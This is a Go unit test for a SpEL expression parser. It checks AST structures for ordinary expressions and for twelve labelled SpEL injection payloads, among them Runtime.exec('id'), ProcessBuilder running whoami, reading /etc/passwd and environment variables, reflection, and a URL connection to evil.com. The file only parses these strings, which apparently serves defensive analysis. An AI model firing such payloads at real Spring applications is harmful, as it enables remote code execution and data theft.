package main

import (
	"fmt"
	"github.com/weaweawe01/ParserSpel/ast"
	"testing"
)

// TestSpelParserAnalysis 测试SpEL AST树结构的正确性
func TestSpelParserAnalysis(t *testing.T) {
	fmt.Println("=== SpEL AST树结构测试 ===")

	// 测试用例定义
	testCases := []struct {
		name       string
		expression string
		expected   ASTExpectation
	}{
		{
			name:       "简单字符串字面量",
			expression: "'hello'",
			expected: ASTExpectation{
				NodeType: "StringLiteral",
				Value:    "'hello'",
				Children: []ASTExpectation{},
			},
		},
		{
			name:       "数字字面量",
			expression: "42",
			expected: ASTExpectation{
				NodeType: "Literal",
				Value:    "42",
				Children: []ASTExpectation{},
			},
		},
		{
			name:       "布尔字面量",
			expression: "true",
			expected: ASTExpectation{
				NodeType: "BooleanLiteral",
				Value:    "true",
				Children: []ASTExpectation{},
			},
		},
		{
			name:       "标识符",
			expression: "userName",
			expected: ASTExpectation{
				NodeType: "PropertyOrFieldReference",
				Value:    "userName",
				Children: []ASTExpectation{},
			},
		},
		{
			name:       "属性访问",
			expression: "user.name",
			expected: ASTExpectation{
				NodeType: "CompoundExpression",
				Value:    "user.name",
				Children: []ASTExpectation{
					{
						NodeType: "PropertyOrFieldReference",
						Value:    "user",
						Children: []ASTExpectation{},
					},
					{
						NodeType: "PropertyOrFieldReference",
						Value:    ".name",
						Children: []ASTExpectation{},
					},
				},
			},
		},
		{
			name:       "类型引用",
			expression: "T(java.lang.String)",
			expected: ASTExpectation{
				NodeType: "TypeReference",
				Value:    "T(java.lang.String)",
				Children: []ASTExpectation{
					{
						NodeType: "QualifiedIdentifier",
						Value:    "java.lang.String",
						Children: []ASTExpectation{
							{
								NodeType: "Identifier",
								Value:    "java",
								Children: []ASTExpectation{},
							},
							{
								NodeType: "Identifier",
								Value:    "lang",
								Children: []ASTExpectation{},
							},
							{
								NodeType: "Identifier",
								Value:    "String",
								Children: []ASTExpectation{},
							},
						},
					},
				},
			},
		},
		{
			name:       "变量引用",
			expression: "#root",
			expected: ASTExpectation{
				NodeType: "VariableReference",
				Value:    "#root",
				Children: []ASTExpectation{},
			},
		},
		{
			name:       "Bean引用",
			expression: "@myBean",
			expected: ASTExpectation{
				NodeType: "BeanReference",
				Value:    "@myBean",
				Children: []ASTExpectation{},
			},
		},
		{
			name:       "方法调用（无参数）",
			expression: "user.getName()",
			expected: ASTExpectation{
				NodeType: "CompoundExpression",
				Value:    "user.getName()", // 修正为正确的输出格式
				Children: []ASTExpectation{
					{
						NodeType: "PropertyOrFieldReference",
						Value:    "user",
						Children: []ASTExpectation{},
					},
					{
						NodeType: "MethodReference",
						Value:    "getName()",
						Children: []ASTExpectation{},
					},
				},
			},
		},
		{
			name:       "方法调用（有参数）",
			expression: "text.substring(1, 5)",
			expected: ASTExpectation{
				NodeType: "CompoundExpression",
				Value:    "text.substring(1, 5)", // 修正为正确的输出格式
				Children: []ASTExpectation{
					{
						NodeType: "PropertyOrFieldReference",
						Value:    "text",
						Children: []ASTExpectation{},
					},
					{
						NodeType: "MethodReference",
						Value:    "substring(1, 5)",
						Children: []ASTExpectation{
							{
								NodeType: "Literal",
								Value:    "1",
								Children: []ASTExpectation{},
							},
							{
								NodeType: "Literal",
								Value:    "5",
								Children: []ASTExpectation{},
							},
						},
					},
				},
			},
		},
		{
			name:       "构造函数调用",
			expression: "new java.lang.String('hello')",
			expected: ASTExpectation{
				NodeType: "ConstructorReference",
				Value:    "new java.lang.String('hello')",
				Children: []ASTExpectation{
					{
						NodeType: "QualifiedIdentifier",
						Value:    "java.lang.String",
						Children: []ASTExpectation{
							{
								NodeType: "Identifier",
								Value:    "java",
								Children: []ASTExpectation{},
							},
							{
								NodeType: "Identifier",
								Value:    "lang",
								Children: []ASTExpectation{},
							},
							{
								NodeType: "Identifier",
								Value:    "String",
								Children: []ASTExpectation{},
							},
						},
					},
					{
						NodeType: "StringLiteral",
						Value:    "'hello'",
						Children: []ASTExpectation{},
					},
				},
			},
		},
		{
			name:       "null字面量",
			expression: "null",
			expected: ASTExpectation{
				NodeType: "NullLiteral",
				Value:    "null",
				Children: []ASTExpectation{},
			},
		},
		// === 攻击性 Payload 测试用例 ===
		{
			name:       "攻击Payload1-Runtime命令执行",
			expression: "T(java.lang.Runtime).getRuntime().exec('id')",
			expected: ASTExpectation{
				NodeType: "CompoundExpression",
				Value:    "T(java.lang.Runtime).getRuntime().exec('id')",
				Children: []ASTExpectation{
					{
						NodeType: "TypeReference",
						Value:    "T(java.lang.Runtime)",
						Children: []ASTExpectation{
							{
								NodeType: "QualifiedIdentifier",
								Value:    "java.lang.Runtime",
								Children: []ASTExpectation{
									{NodeType: "Identifier", Value: "java", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "lang", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "Runtime", Children: []ASTExpectation{}},
								},
							},
						},
					},
					{
						NodeType: "MethodReference",
						Value:    "getRuntime()",
						Children: []ASTExpectation{},
					},
					{
						NodeType: "MethodReference",
						Value:    "exec('id')",
						Children: []ASTExpectation{
							{NodeType: "StringLiteral", Value: "'id'", Children: []ASTExpectation{}},
						},
					},
				},
			},
		},
		{
			name:       "攻击Payload2-ProcessBuilder命令执行",
			expression: "new java.lang.ProcessBuilder('cmd', '/c', 'whoami').start()",
			expected: ASTExpectation{
				NodeType: "CompoundExpression",
				Value:    "new java.lang.ProcessBuilder('cmd', '/c', 'whoami').start()",
				Children: []ASTExpectation{
					{
						NodeType: "ConstructorReference",
						Value:    "new java.lang.ProcessBuilder('cmd', '/c', 'whoami')",
						Children: []ASTExpectation{
							{
								NodeType: "QualifiedIdentifier",
								Value:    "java.lang.ProcessBuilder",
								Children: []ASTExpectation{
									{NodeType: "Identifier", Value: "java", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "lang", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "ProcessBuilder", Children: []ASTExpectation{}},
								},
							},
							{NodeType: "StringLiteral", Value: "'cmd'", Children: []ASTExpectation{}},
							{NodeType: "StringLiteral", Value: "'/c'", Children: []ASTExpectation{}},
							{NodeType: "StringLiteral", Value: "'whoami'", Children: []ASTExpectation{}},
						},
					},
					{
						NodeType: "MethodReference",
						Value:    "start()",
						Children: []ASTExpectation{},
					},
				},
			},
		},
		{
			name:       "攻击Payload3-系统属性读取",
			expression: "T(java.lang.System).getProperty('user.dir')",
			expected: ASTExpectation{
				NodeType: "CompoundExpression",
				Value:    "T(java.lang.System).getProperty('user.dir')",
				Children: []ASTExpectation{
					{
						NodeType: "TypeReference",
						Value:    "T(java.lang.System)",
						Children: []ASTExpectation{
							{
								NodeType: "QualifiedIdentifier",
								Value:    "java.lang.System",
								Children: []ASTExpectation{
									{NodeType: "Identifier", Value: "java", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "lang", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "System", Children: []ASTExpectation{}},
								},
							},
						},
					},
					{
						NodeType: "MethodReference",
						Value:    "getProperty('user.dir')",
						Children: []ASTExpectation{
							{NodeType: "StringLiteral", Value: "'user.dir'", Children: []ASTExpectation{}},
						},
					},
				},
			},
		},
		{
			name:       "攻击Payload4-文件操作",
			expression: "new java.io.File('/etc/passwd').exists()",
			expected: ASTExpectation{
				NodeType: "CompoundExpression",
				Value:    "new java.io.File('/etc/passwd').exists()",
				Children: []ASTExpectation{
					{
						NodeType: "ConstructorReference",
						Value:    "new java.io.File('/etc/passwd')",
						Children: []ASTExpectation{
							{
								NodeType: "QualifiedIdentifier",
								Value:    "java.io.File",
								Children: []ASTExpectation{
									{NodeType: "Identifier", Value: "java", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "io", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "File", Children: []ASTExpectation{}},
								},
							},
							{NodeType: "StringLiteral", Value: "'/etc/passwd'", Children: []ASTExpectation{}},
						},
					},
					{
						NodeType: "MethodReference",
						Value:    "exists()",
						Children: []ASTExpectation{},
					},
				},
			},
		},
		{
			name:       "攻击Payload5-反射获取类",
			expression: "T(java.lang.Class).forName('java.lang.Runtime')",
			expected: ASTExpectation{
				NodeType: "CompoundExpression",
				Value:    "T(java.lang.Class).forName('java.lang.Runtime')",
				Children: []ASTExpectation{
					{
						NodeType: "TypeReference",
						Value:    "T(java.lang.Class)",
						Children: []ASTExpectation{
							{
								NodeType: "QualifiedIdentifier",
								Value:    "java.lang.Class",
								Children: []ASTExpectation{
									{NodeType: "Identifier", Value: "java", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "lang", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "Class", Children: []ASTExpectation{}},
								},
							},
						},
					},
					{
						NodeType: "MethodReference",
						Value:    "forName('java.lang.Runtime')",
						Children: []ASTExpectation{
							{NodeType: "StringLiteral", Value: "'java.lang.Runtime'", Children: []ASTExpectation{}},
						},
					},
				},
			},
		},
		{
			name:       "攻击Payload6-ScriptEngine执行",
			expression: "new javax.script.ScriptEngineManager().getEngineByName('js')",
			expected: ASTExpectation{
				NodeType: "CompoundExpression",
				Value:    "new javax.script.ScriptEngineManager().getEngineByName('js')",
				Children: []ASTExpectation{
					{
						NodeType: "ConstructorReference",
						Value:    "new javax.script.ScriptEngineManager()",
						Children: []ASTExpectation{
							{
								NodeType: "QualifiedIdentifier",
								Value:    "javax.script.ScriptEngineManager",
								Children: []ASTExpectation{
									{NodeType: "Identifier", Value: "javax", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "script", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "ScriptEngineManager", Children: []ASTExpectation{}},
								},
							},
						},
					},
					{
						NodeType: "MethodReference",
						Value:    "getEngineByName('js')",
						Children: []ASTExpectation{
							{NodeType: "StringLiteral", Value: "'js'", Children: []ASTExpectation{}},
						},
					},
				},
			},
		},
		{
			name:       "攻击Payload7-URL连接",
			expression: "new java.net.URL('http://evil.com').openConnection()",
			expected: ASTExpectation{
				NodeType: "CompoundExpression",
				Value:    "new java.net.URL('http://evil.com').openConnection()",
				Children: []ASTExpectation{
					{
						NodeType: "ConstructorReference",
						Value:    "new java.net.URL('http://evil.com')",
						Children: []ASTExpectation{
							{
								NodeType: "QualifiedIdentifier",
								Value:    "java.net.URL",
								Children: []ASTExpectation{
									{NodeType: "Identifier", Value: "java", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "net", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "URL", Children: []ASTExpectation{}},
								},
							},
							{NodeType: "StringLiteral", Value: "'http://evil.com'", Children: []ASTExpectation{}},
						},
					},
					{
						NodeType: "MethodReference",
						Value:    "openConnection()",
						Children: []ASTExpectation{},
					},
				},
			},
		},
		{
			name:       "攻击Payload8-Base64解码",
			expression: "T(java.util.Base64).getDecoder().decode('Y21k')",
			expected: ASTExpectation{
				NodeType: "CompoundExpression",
				Value:    "T(java.util.Base64).getDecoder().decode('Y21k')",
				Children: []ASTExpectation{
					{
						NodeType: "TypeReference",
						Value:    "T(java.util.Base64)",
						Children: []ASTExpectation{
							{
								NodeType: "QualifiedIdentifier",
								Value:    "java.util.Base64",
								Children: []ASTExpectation{
									{NodeType: "Identifier", Value: "java", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "util", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "Base64", Children: []ASTExpectation{}},
								},
							},
						},
					},
					{
						NodeType: "MethodReference",
						Value:    "getDecoder()",
						Children: []ASTExpectation{},
					},
					{
						NodeType: "MethodReference",
						Value:    "decode('Y21k')",
						Children: []ASTExpectation{
							{NodeType: "StringLiteral", Value: "'Y21k'", Children: []ASTExpectation{}},
						},
					},
				},
			},
		},
		{
			name:       "攻击Payload9-Socket连接",
			expression: "new java.net.Socket('127.0.0.1', 8080)",
			expected: ASTExpectation{
				NodeType: "ConstructorReference",
				Value:    "new java.net.Socket('127.0.0.1', 8080)",
				Children: []ASTExpectation{
					{
						NodeType: "QualifiedIdentifier",
						Value:    "java.net.Socket",
						Children: []ASTExpectation{
							{NodeType: "Identifier", Value: "java", Children: []ASTExpectation{}},
							{NodeType: "Identifier", Value: "net", Children: []ASTExpectation{}},
							{NodeType: "Identifier", Value: "Socket", Children: []ASTExpectation{}},
						},
					},
					{NodeType: "StringLiteral", Value: "'127.0.0.1'", Children: []ASTExpectation{}},
					{NodeType: "Literal", Value: "8080", Children: []ASTExpectation{}},
				},
			},
		},
		{
			name:       "攻击Payload10-ClassLoader获取",
			expression: "T(java.lang.Thread).currentThread().getContextClassLoader()",
			expected: ASTExpectation{
				NodeType: "CompoundExpression",
				Value:    "T(java.lang.Thread).currentThread().getContextClassLoader()",
				Children: []ASTExpectation{
					{
						NodeType: "TypeReference",
						Value:    "T(java.lang.Thread)",
						Children: []ASTExpectation{
							{
								NodeType: "QualifiedIdentifier",
								Value:    "java.lang.Thread",
								Children: []ASTExpectation{
									{NodeType: "Identifier", Value: "java", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "lang", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "Thread", Children: []ASTExpectation{}},
								},
							},
						},
					},
					{
						NodeType: "MethodReference",
						Value:    "currentThread()",
						Children: []ASTExpectation{},
					},
					{
						NodeType: "MethodReference",
						Value:    "getContextClassLoader()",
						Children: []ASTExpectation{},
					},
				},
			},
		},
		{
			name:       "攻击Payload11-环境变量读取",
			expression: "T(java.lang.System).getenv('PATH')",
			expected: ASTExpectation{
				NodeType: "CompoundExpression",
				Value:    "T(java.lang.System).getenv('PATH')",
				Children: []ASTExpectation{
					{
						NodeType: "TypeReference",
						Value:    "T(java.lang.System)",
						Children: []ASTExpectation{
							{
								NodeType: "QualifiedIdentifier",
								Value:    "java.lang.System",
								Children: []ASTExpectation{
									{NodeType: "Identifier", Value: "java", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "lang", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "System", Children: []ASTExpectation{}},
								},
							},
						},
					},
					{
						NodeType: "MethodReference",
						Value:    "getenv('PATH')",
						Children: []ASTExpectation{
							{NodeType: "StringLiteral", Value: "'PATH'", Children: []ASTExpectation{}},
						},
					},
				},
			},
		},
		{
			name:       "攻击Payload12-反射执行方法",
			expression: "T(java.lang.Runtime).class.getMethod('exec', T(java.lang.String))",
			expected: ASTExpectation{
				NodeType: "CompoundExpression",
				Value:    "T(java.lang.Runtime).class.getMethod('exec', T(java.lang.String))",
				Children: []ASTExpectation{
					{
						NodeType: "TypeReference",
						Value:    "T(java.lang.Runtime)",
						Children: []ASTExpectation{
							{
								NodeType: "QualifiedIdentifier",
								Value:    "java.lang.Runtime",
								Children: []ASTExpectation{
									{NodeType: "Identifier", Value: "java", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "lang", Children: []ASTExpectation{}},
									{NodeType: "Identifier", Value: "Runtime", Children: []ASTExpectation{}},
								},
							},
						},
					},
					{
						NodeType: "PropertyOrFieldReference",
						Value:    ".class",
						Children: []ASTExpectation{},
					},
					{
						NodeType: "MethodReference",
						Value:    "getMethod('exec', T(java.lang.String))",
						Children: []ASTExpectation{
							{NodeType: "StringLiteral", Value: "'exec'", Children: []ASTExpectation{}},
							{
								NodeType: "TypeReference",
								Value:    "T(java.lang.String)",
								Children: []ASTExpectation{
									{
										NodeType: "QualifiedIdentifier",
										Value:    "java.lang.String",
										Children: []ASTExpectation{
											{NodeType: "Identifier", Value: "java", Children: []ASTExpectation{}},
											{NodeType: "Identifier", Value: "lang", Children: []ASTExpectation{}},
											{NodeType: "Identifier", Value: "String", Children: []ASTExpectation{}},
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	// 执行测试用例
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			fmt.Printf("\n--- 测试用例: %s ---\n", tc.name)
			fmt.Printf("表达式: %s\n", tc.expression)

			// 解析表达式
			config := ast.NewSpelParserConfiguration()
			parser := ast.NewInternalSpelExpressionParser(config)

			spelExpr, err := parser.DoParseExpression(tc.expression)
			if err != nil {
				t.Fatalf("解析失败: %v", err)
			}

			if spelExpr == nil || spelExpr.AST == nil {
				t.Fatal("解析结果为空")
			}

			// 打印实际的AST树结构
			fmt.Println("实际AST结构:")
			ast.PrintAST(spelExpr.AST, 0)

			// 验证AST结构
			fmt.Println("验证AST结构...")
			if !validateASTStructure(spelExpr.AST, tc.expected) {
				t.Errorf("AST结构不匹配!\n期望: %+v\n实际AST见上方输出", tc.expected)
			} else {
				fmt.Println("✓ AST结构验证通过")
			}
		})
	}
}

// ASTExpectation 定义预期的AST节点结构
type ASTExpectation struct {
	NodeType string           // 节点类型名称
	Value    string           // 节点的字符串表示
	Children []ASTExpectation // 子节点期望
}

// validateASTStructure 验证AST节点结构是否符合预期
func validateASTStructure(actual ast.SpelNode, expected ASTExpectation) bool {
	if actual == nil {
		return expected.NodeType == ""
	}

	// 检查节点类型
	actualType := getNodeTypeName(actual)
	if actualType != expected.NodeType {
		fmt.Printf("节点类型不匹配: 期望 %s, 实际 %s\n", expected.NodeType, actualType)
		return false
	}

	// 检查节点值
	actualValue := actual.ToStringAST()
	if actualValue != expected.Value {
		fmt.Printf("节点值不匹配: 期望 '%s', 实际 '%s'\n", expected.Value, actualValue)
		return false
	}

	// 检查子节点数量
	actualChildren := actual.GetChildren()
	if len(actualChildren) != len(expected.Children) {
		fmt.Printf("子节点数量不匹配: 期望 %d, 实际 %d\n", len(expected.Children), len(actualChildren))
		return false
	}

	// 递归检查子节点
	for i, expectedChild := range expected.Children {
		if !validateASTStructure(actualChildren[i], expectedChild) {
			fmt.Printf("子节点[%d]验证失败\n", i)
			return false
		}
	}

	return true
}

// getNodeTypeName 获取节点类型名称
func getNodeTypeName(node ast.SpelNode) string {
	switch node.(type) {
	case *ast.StringLiteral:
		return "StringLiteral"
	case *ast.BooleanLiteral:
		return "BooleanLiteral"
	case *ast.NullLiteral:
		return "NullLiteral"
	case *ast.Literal:
		return "Literal"
	case *ast.Identifier:
		return "Identifier"
	case *ast.PropertyOrFieldReference:
		return "PropertyOrFieldReference"
	case *ast.CompoundExpression:
		return "CompoundExpression"
	case *ast.VariableReference:
		return "VariableReference"
	case *ast.BeanReference:
		return "BeanReference"
	case *ast.TypeReference:
		return "TypeReference"
	case *ast.QualifiedIdentifier:
		return "QualifiedIdentifier"
	case *ast.MethodReference:
		return "MethodReference"
	case *ast.ConstructorReference:
		return "ConstructorReference"
	case *ast.ArrayConstructor:
		return "ArrayConstructor"
	case *ast.TemplateExpression:
		return "TemplateExpression"
	case *ast.InlineList:
		return "InlineList"
	case *ast.InlineMap:
		return "InlineMap"
	case *ast.Indexer:
		return "Indexer"
	case *ast.Assign:
		return "Assign"
	case *ast.OpLT:
		return "OpLT"
	case *ast.OpGT:
		return "OpGT"
	case *ast.OpPlus:
		return "OpPlus"
	case *ast.Selection:
		return "Selection"
	case *ast.Projection:
		return "Projection"
	case *ast.FunctionReference:
		return "FunctionReference"
	case *ast.Ternary:
		return "Ternary"
	case *ast.Elvis:
		return "Elvis"
	default:
		return fmt.Sprintf("%T", node)
	}
}
